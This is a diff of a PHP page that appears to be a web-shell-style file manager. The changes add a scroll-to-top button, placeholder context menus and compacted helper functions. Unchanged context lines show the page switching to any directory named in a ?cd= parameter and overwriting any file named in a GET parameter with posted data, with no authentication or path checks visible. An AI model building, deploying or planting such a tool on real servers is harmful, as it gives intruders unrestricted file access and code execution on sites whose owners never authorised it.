@@ -220,25 +220,149 @@
 	.submit input[type=submit]:hover {
 		cursor: pointer;
 	}
+	#scroll {
+    	position:fixed;
+    	right:30px;
+    	bottom:30px;
+    	cursor:pointer;
+    	width:50px;
+    	height:50px;
+    	background-color:#3498db;
+    	text-indent:-9999px;
+    	display:none;
+    	-webkit-border-radius:60px;
+    	-moz-border-radius:60px;
+    	border-radius:60px
+	}
+	#scroll span {
+    	position:absolute;
+    	top:50%;
+    	left:50%;
+    	margin-left:-8px;
+    	margin-top:-12px;
+    	height:0;
+    	width:0;
+    	border:8px solid transparent;
+    	border-bottom-color:#ffffff;
+	}
+	#scroll:hover {
+    	background-color:#e74c3c;
+    	opacity:1;filter:"alpha(opacity=100)";
+    	-ms-filter:"alpha(opacity=100)";
+	}
+	#contextMenu {
+  		position: absolute;
+  		display: none;
+  		background: #fff;
+  		border-radius:10px;
+  		box-shadow: 0 0 3px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
+	}
+	#contextMenuFile {
+  		position: absolute;
+  		display: none;
+  		background: #fff;
+  		border-radius:10px;
+  		box-shadow: 0 0 3px rgba(0,0,0,0.16), 0 3px 6px rgba(0,0,0,0.23);
+	}
+	#contextMenu ul {
+		padding: 0;
+	}
+	#contextMenu ul li {
+		list-style-type: none;
+	}
+	#contextMenu ul li a {
+		
+	}
+	#contextMenuFile ul {
+		padding: 0;
+	}
+	#contextMenuFile ul li {
+		list-style-type: none;
+	}
+	#contextMenuFile ul li a {
+		
+	}
 </style>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script type="text/javascript">  
+	$(document).ready(function(){ 
+    	$(window).scroll(function(){ 
+        	if ($(this).scrollTop() > 100) { 
+            	$('#scroll').fadeIn(); 
+        	} else { 
+            	$('#scroll').fadeOut(); 
+        	} 
+    	}); 
+    	$('#scroll').click(function(){ 
+        	$("html, body").animate({ scrollTop: 0 }, 600); 
+        	return false; 
+    	}); 
+	});
+</script>
+<script type="text/javascript">
+	$(function() {
+    var $contextMenu = $("#contextMenu");
+    $("body").on("contextmenu", ".isi .files .dir", function(e) {
+         $contextMenu.css({
+              display: "block",
+              left: e.pageX,
+              top: e.pageY
+         });
+        debugger;
+         return false;
+    });
+
+    $('html').click(function() {
+         $contextMenu.hide();
+    });
+  
+  $("#contextMenu li a").click(function(e){
+    var  f = $(this);
+    debugger;
+  });
+
+});
+</script>
+<script type="text/javascript">
+	$(function() {
+    var $contextMenu = $("#contextMenuFile");
+    $("body").on("contextmenu", ".isi .files .file", function(e) {
+         $contextMenu.css({
+              display: "block",
+              left: e.pageX,
+              top: e.pageY
+         });
+        debugger;
+         return false;
+    });
+
+    $('html').click(function() {
+         $contextMenu.hide();
+    });
+  
+  $("#contextMenuFile li a").click(function(e){
+    var  f = $(this);
+    debugger;
+  });
+
+});
+</script>
 <body>
+	<a href="#" id="scroll" style="display: none;"><span></span></a>
 	<?php
 	function files($type) {
 		$array = array();
 		foreach (scandir(getcwd()) as $key => $value) {
 			$file['name'] = getcwd() . DIRECTORY_SEPARATOR . $value;
 			switch ($type) {
-				case 'dir':
-					if (!is_dir($file['name']) || $value === '.' || $value === '..') continue 2;
-					break;
-				case 'file':
-					if (!is_file($file['name'])) continue 2;
-					break;
+				case 'dir':if (!is_dir($file['name']) || $value === '.' || $value === '..') continue 2;break;
+				case 'file':if (!is_file($file['name'])) continue 2;break;
 			}
 			$file['names'] = basename($file['name']);
 			$file['ftime'] = ftime($file['name']);
 			$file['owner'] = owner($file['name']);
-			$file['type']  = (is_dir($file['name'])) ? filetype($file['name']) : "file " . strtoupper(getext($file['name']));
+			$file['type']  = (is_dir($file['name'])) ? @filetype($file['name']) : "file " .strtoupper(getext($file['name']));
 			$file['size']  = (is_dir($file['name'])) ? countDir($file['name']). " items" : size($file['name']);
 			$array[] = $file;
 		} return $array;
@@ -246,70 +370,37 @@
 	function perms($filename) {
         $perms = @fileperms($filename);
         switch ($perms & 0xF000) {
-            case 0xC000:
-                $info = 's';
-                break;
-            case 0xA000:
-                $info = 'l';
-                break;
-            case 0x8000:
-                $info = 'r';
-                break;
-            case 0x6000:
-                $info = 'b';
-                break;
-            case 0x4000:
-                $info = 'd';
-                break;
-            case 0x2000:
-                $info = 'c';
-                break;
-            case 0x1000:
-                $info = 'p';
-                break;
-            default:
-                $info = 'u';
+            case 0xC000:$info = 's';break;
+            case 0xA000:$info = 'l';break;
+            case 0x8000:$info = 'r';break;
+            case 0x6000:$info = 'b';break;
+            case 0x4000:$info = 'd';break;
+            case 0x2000:$info = 'c';break;
+            case 0x1000:$info = 'p';break;
+            default:$info = 'u';
         }
-        $info .= (($perms & 0x0100) ? 'r' : '-');
-        $info .= (($perms & 0x0080) ? 'w' : '-');
-        $info .= (($perms & 0x0040) ?
-                    (($perms & 0x0800) ? 's' : 'x' ) :
-                    (($perms & 0x0800) ? 'S' : '-'));
-        $info .= (($perms & 0x0020) ? 'r' : '-');
-        $info .= (($perms & 0x0010) ? 'w' : '-');
-        $info .= (($perms & 0x0008) ?
-                    (($perms & 0x0400) ? 's' : 'x' ) :
-                    (($perms & 0x0400) ? 'S' : '-'));
-        $info .= (($perms & 0x0004) ? 'r' : '-');
-        $info .= (($perms & 0x0002) ? 'w' : '-');
-        $info .= (($perms & 0x0001) ?
-                    (($perms & 0x0200) ? 't' : 'x' ) :
-                    (($perms & 0x0200) ? 'T' : '-'));
+        $info .= (($perms & 0x0100)?'r':'-');
+        $info .= (($perms & 0x0080)?'w':'-');
+        $info .= (($perms & 0x0040)?(($perms & 0x0800)?'s':'x'):(($perms & 0x0800) ?'S':'-'));
+        $info .= (($perms & 0x0020)?'r':'-');
+        $info .= (($perms & 0x0010)?'w':'-');
+        $info .= (($perms & 0x0008)?(($perms & 0x0400)?'s':'x'):(($perms & 0x0400)?'S':'-'));
+        $info .= (($perms & 0x0004)?'r':'-');
+        $info .= (($perms & 0x0002)?'w':'-');
+        $info .= (($perms & 0x0001)?(($perms & 0x0200)?'t':'x'):(($perms & 0x0200)?'T':'-'));
         return $info;
     }
     function wr($filename, $perms, $type) {
         if (is_writable($filename)) {
             switch ($type) {
-                case 1:
-                    print "<font color='#000'>{$perms}</font>";
-                    break;
-                case 2:
-                    print "<font color='green'>{$perms}</font>";
-                    break;
+                case 1:print "<font color='#000'>{$perms}</font>";break;
+                case 2:print "<font color='green'>{$perms}</font>";break;
             }
-        } else {
-            print "<font color='red'>{$perms}</font>";
-        }
+        } else{print "<font color='red'>{$perms}</font>";}
     }
-	function getext($filename) {
-		return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
-	}
-	function cd($directory) {
-		return chdir($directory);
-	}
-	function countDir($filename) {
-        return @count(scandir($filename)) -2;
-    }
+	function getext($filename){return strtolower(pathinfo($filename, PATHINFO_EXTENSION));}
+	function cd($directory){return chdir($directory);}
+	function countDir($filename){return @count(scandir($filename)) -2;}
 	function size($filename) {
         if (is_file($filename)) {
             $filepath = $filename;
@@ -338,9 +429,7 @@
             $group = filegroup($filename);
         } return ($owner.":".$group);
     }
-    function ftime($filename) {
-        return date('d M Y - H:i A', @filemtime($filename));
-    }
+    function ftime($filename){return date('d M Y - H:i A', @filemtime($filename));}
     function geticon($filename) {
         switch (getext($filename)) {
             case 'php1':case 'php2':case 'php3':case 'php4':case 'php5':case 'php6':case 'phtml':case 'php':print('https://image.flaticon.com/icons/svg/2306/2306154.svg');break;
@@ -379,13 +468,23 @@
             default:print('https://image.flaticon.com/icons/svg/833/833524.svg');break;
         }
     }
-	if (isset($_GET['cd'])){cd($_GET['cd']);}
+    function back($location) {
+    	switch (@$_GET['action']) {
+    		case 'edit':
+    			return $location;
+    			break;
+    		default:
+    			return dirname($location);
+    			break;
+    	}
+    }
+	if(isset($_GET['cd'])){cd($_GET['cd']);}
 	?>
 	<div class="isi">
 		<div class="files">
 			<div class="header">
 				<div class="back">
-					<a href="?cd=<?= dirname(getcwd()) ?>"><i class="fa fa-arrow-left" aria-hidden="true"></i></a>
+					<a href="?cd=<?= back(getcwd()) ?>"><i class="fa fa-arrow-left" aria-hidden="true"></i></a>
 				</div>
 				<div class="dirname">
 					<?= basename(getcwd()) ?>
@@ -399,11 +498,8 @@
 				case 'edit':
 				if (isset($_POST['submit'])) {
 					$handle = fopen($_GET['file'], "w");
-					if (fwrite($handle, $_POST['data'])) {
-						print("success");
-					} else {
-						print("failed");
-					}
+					if(fwrite($handle, $_POST['data'])){print("success");}
+					else{print("failed");}
 				}
 					?>
 					<div class="edit">
@@ -460,6 +556,14 @@
 								</div>
 							</div>
 						</div>
+						<div id="contextMenu">
+							<ul>
+								<li><a href="#<?= $dir['names'] ?>">Action 1</a></li>
+								<li><a href="#">Action 2</a></li>
+								<li><a href="#">Some More Actions</a></li>
+								<li><a href="#">Final Action</a></li>
+							</ul>
+						</div>
 					</div>
 				</a>
 			<?php }
@@ -492,6 +596,15 @@
 							</div>
 						</div>
 					</a>
+					<div id="contextMenuFile">
+						<ul>
+							<li><a tabindex="-1" href="#<?= $file['names'] ?>">Action 1</a></li>
+							<li><a tabindex="-1" href="#">Action 2</a></li>
+							<li><a tabindex="-1" href="#">Some More Actions</a></li>
+							<li class="divider"></li>
+							<li><a tabindex="-1" href="#">Final Action</a></li>
+						</ul>
+					</div>
 				</div>
 			<?php }
 			?>
